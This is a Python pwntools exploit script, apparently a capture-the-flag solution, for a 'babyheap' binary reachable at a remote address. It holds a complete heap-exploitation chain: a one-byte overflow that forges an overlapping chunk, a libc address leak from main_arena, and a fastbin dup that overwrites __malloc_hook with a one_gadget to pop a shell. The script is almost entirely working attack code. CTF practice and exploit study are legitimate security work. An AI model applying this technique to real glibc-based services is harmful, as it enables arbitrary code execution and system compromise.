from pwn import *

context.log_level= 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("202.120.7.204", 127 )
    one_gadget_offset = 0x3f35a
else:
    p = process("./babyheap")
    one_gadget_offset = 0x4526a
    main_arena_offset = 0x3c4b20
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
               """)
               # b *(0x555555554000 + 0x119b)
               # b *(0x555555554000 + 0xe88)
               # b *(0x555555554000 + 0xfa9)
               # b *(0x555555554000 + 0xd54) 
               # b *(0x555555554000 + 0x10C2) 
               
def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.sendline(str(size))

def update(idx, size, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(size))
    p.sendline(content)

def delete(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.sendline(str(idx))

def view(index):
    p.readuntil("Command: ")
    p.sendline("4")
    p.readuntil("Index: ")
    p.sendline(str(index))
    p.readuntil("Chunk[" + str(index) + "]: ")
    content = p.readline()
    return content


print "[-]Leak and setup phase"
alloc(24) # idx 0
alloc(16)
alloc(72) # Overlap smallbin with this fastbin so we can view metadata
alloc(24)
alloc(16) # idx 4

 # This is for exploit phase. Get a fastbin chunk in main_arena freelist for later
alloc(88)
delete(5)

# One-byte overflow vuln
update(0, 25, "A"*24 + "\x91") # last byte is new size for chunk idx 1. Smallbin sized

update(3, 24, 'B'*16 + p64(0x90)) # Set prev_size of smallbin chunk's nextchunk

delete(1) # Free forged smallbin chunk

alloc(24) # alloc a new fastbin size, will be broken off the start of the freed smallbin chunk

# Smallbin metadata (main_arena freelist ptrs) now overlaps with chunk 2
arena_leak = u64(view(2)[:8])
print "main_arena leak: ", hex(arena_leak)

libc_base = arena_leak - 0x3c4b78
print "libc_base addr: ", hex(libc_base)

main_arena = libc_base + main_arena_offset
malloc_hook = main_arena - 0x10
print "malloc_hook addr: ", hex(malloc_hook)

one_gadget = libc_base + one_gadget_offset

# Exploit phase
print "[-]Exploit phase"

# We are going to use fastbin dup attack to allocate a fastbin over the main_arena, so we can modify main_arena->top to point to malloc_hook
# We have to have a populated fastbin freelist so we can use its 0x55/0x56 as the size field for our fake chunk
# We did this in part 1

# Now that we have a populated fastbin in main_arena, get the address of the fake chunk with size 0x56
aligned_main_arena_chunk = main_arena + 0x25
print "aligned_main_arena_chunk: ", hex(aligned_main_arena_chunk)

# Allocate two chunks of fastbin size 0x50
alloc(64) #This one is broken off fake smallbin chunk
alloc(64)
delete(6) # free something else 
delete(5) # free fastbin chunk that overlaps fastbin chunk 2

# Corrupt fd ptr of fastbin chunk 5, using chunk2, to our fake chunk over main_arena
update(2, 8, p64(aligned_main_arena_chunk))

alloc(64) 
alloc(64) # This alloc returns chunk over main_arena. idx 6

# Modify top field of main_arena to point to malloc_hook
update(6, 43, "B"*35 + p64(malloc_hook-16))

# Now, allocate something over malloc_hook 
# Has to be a new size, so it's served from top chunk and not a bin
alloc(40) # idx 7

# update malloc_hook to one_gadget
update(7, 8, p64(one_gadget))

# # Trigger malloc_hook one_gadget
alloc(22)

p.interactive()







